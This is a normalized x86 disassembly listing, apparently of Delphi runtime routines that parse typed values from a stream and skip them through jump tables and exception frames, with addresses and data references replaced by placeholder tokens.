xor eax eax
push ebp
push sub_41ae2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419d28
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41a798
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4192b8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4169bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41b788
lea eax [ ebp - 0x4 ]
call sub_40575c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_413eb8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae31
lea eax [ ebp - 0x8 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
sub_41ae38
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b133
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b13a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0x24 ]
call sub_40457c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ec0
retn
jmp [ eax * 4 + jump_table_41aec8 ]
mov eax [ rw-data ]
call sub_41980c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4138f4
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d28
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_419de8
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413968
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41a798
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_413820
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413968
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a67c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413bf8
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41b5e8
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413af8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41b6a4
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413b24
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b4cc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413968
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d28
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d28
cmp al 0xd
jne r-xdata
push ebp
call sub_41ad1c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a904
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413e7c
jmp r-xdata
push ebp
call sub_41ad78
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4138f4
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a898
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413968
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41a798
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ac94
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b788
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413968
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41a798
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b788
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413e44
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b788
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4138f4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_419e40
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413e44
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41a798
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41acdc
pop ecx
jmp r-xdata
sub_41b140
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403ef0
jmp r-xdata
mov eax [ ebx ]
call sub_4166a4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b1a0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b4bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b588
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41b499
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41b45a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
mov eax [ ebp - 0x1c ]
call sub_416278
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41b140
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4030ac
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_415fc8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41b3ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405e8c
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4169bc
xor eax eax
push ebp
push sub_41b3df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_416b74
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3e6
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403164
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_416b18
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41b430
call sub_4027c4
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403954
jmp r-xdata
call sub_403900
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_419534
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4a0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41b45f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4196dc
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403900
call sub_403954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4a0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403164
sub_41b4cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b576
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41b549
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b788
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4137c8
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_419824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41985c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b57d
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41b5ac
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419d4c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f8c
mov eax esi
call j_sub_404368
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_419d4c
pop edx
pop esi
pop ebx
retn
sub_41b5e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b695
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_419d28
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41b6a4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404124
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b69c
lea eax [ ebp - 0x8 ]
call sub_40457c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41b788
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_419d4c
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4044e8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419d4c
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_419d4c
jmp r-xdata
jmp r-xdata
call sub_419824
sub_41b6a4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b77b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_419d28
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41b5e8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046c8
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b782
lea eax [ ebp - 0xc ]
call sub_403e9c
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41b788
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_419d4c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047c4
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_419d4c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_419d4c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4044e8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419d4c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405b2c
jmp r-xdata
jmp r-xdata
call sub_419824
sub_41b79c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41b7d8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b5ac
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7df
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_41b7e4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4199e4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41b898
mov eax [ ebx ]
call sub_41a950
pop ebx
pop ebp
retn
sub_41b80c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_419d4c
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41bc90
pop ebx
pop ecx
pop ebp
retn
sub_41b83c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4199e4
test al al
je r-xdata
mov eax [ ebx ]
call sub_419d28
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41a950
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41bc90
jmp r-xdata
mov eax [ ebx ]
call sub_41b898
mov eax [ ebx ]
call sub_4199e4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41ba34
mov eax [ ebx ]
call sub_41a950
sub_41b898
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ba27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b788
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba2e
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
jmp [ eax * 4 + jump_table_41b8cf ]
push ebp
call sub_41b7e4
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b5ac
jmp r-xdata
push ebp
mov eax 0x1
call sub_41b80c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b79c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41b80c
pop ecx
jmp r-xdata
push ebp
call sub_41b83c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
push ebp
mov eax 0x2
call sub_41b80c
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41bc90
jmp r-xdata
push ebp
mov eax 0x1
call sub_41b80c
pop ecx
sub_41ba34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ba71
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b5ac
mov eax ebx
call sub_41b898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba78
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_41ba7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41bb14
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_4199e4
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41b5ac
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41b5ac
jmp r-xdata
mov eax ebx
call sub_41ba34
mov eax ebx
call sub_41a950
jmp r-xdata
mov eax ebx
call sub_4199e4
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41ba7c
mov eax ebx
call sub_41a950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb1b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ec0
retn
sub_41bb24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bbc9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f34
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41c9c0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bbd0
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
sub_41bbf4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41bc1c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_419c7c
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4161b8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403378
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_419c7c
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41bc90
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_419d4c
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_419d4c
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41bcd8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41be81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4198b0
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41be5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_419d4c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4187dc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_419d4c
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41916c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41be37
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41b5e8
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_419d4c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_4187dc
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_419d4c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_413468
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
lea eax [ ebp - 0x1c ]
call sub_40575c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cd80
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be3e
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub_41bea0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c09a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e978
mov eax [ ebp - 0x4 ]
call sub_419d28
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
jmp [ eax * 4 + jump_table_41bee2 ]
mov eax [ ebp - 0x4 ]
call sub_41b788
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a898
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_412ae0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a898
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_412ae0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a898
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412ae0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a67c
mov eax ebx
call sub_412cd8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a6c0
mov eax ebx
call sub_412cd8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a704
mov eax ebx
call sub_412d00
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a754
mov eax ebx
call sub_412cec
jmp r-xdata
lea edx [ ebp - 0x8 ]
